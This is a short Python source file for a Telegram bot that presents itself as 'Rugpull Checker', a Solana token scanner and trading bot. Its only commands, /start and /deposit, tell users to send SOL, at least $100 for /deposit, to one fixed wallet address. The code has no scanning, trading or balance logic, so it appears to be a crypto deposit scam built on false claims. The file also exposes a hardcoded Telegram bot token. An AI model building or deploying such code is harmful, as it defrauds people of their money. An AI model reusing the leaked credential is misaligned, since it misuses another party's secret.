import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Welcome message
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("""Welcome to Rugpull Checker! 
Solana’s fastest bot to scan any coin (SPL token), built by the Rugpull Scan community!

You currently have no SOL in your wallet. To start trading, deposit SOL to your Rugpull Scan wallet address:

[8WGyAt1dd97W37LiDCtgoSe1tQGfJcG6iUV3keRMhcjM](8WGyAt1dd97W37LiDCtgoSe1tQGfJcG6iUV3keRMhcjM)

Once done, tap refresh and your balance will appear here.

To buy a token, enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener, or Meteora.""")

# Deposit address message
def deposit(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("""To start using the bot, deposit a minimum of $100 worth of SOL to this address:
[8WGyAt1dd97W37LiDCtgoSe1tQGfJcG6iUV3keRMhcjM](8WGyAt1dd97W37LiDCtgoSe1tQGfJcG6iUV3keRMhcjM)""")

def main() -> None:
    updater = Updater(token='7716831628:AAF1KCEm6Gjl1TbxWTb8-0zh4qZ7zf2-nhQ', use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('deposit', deposit))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
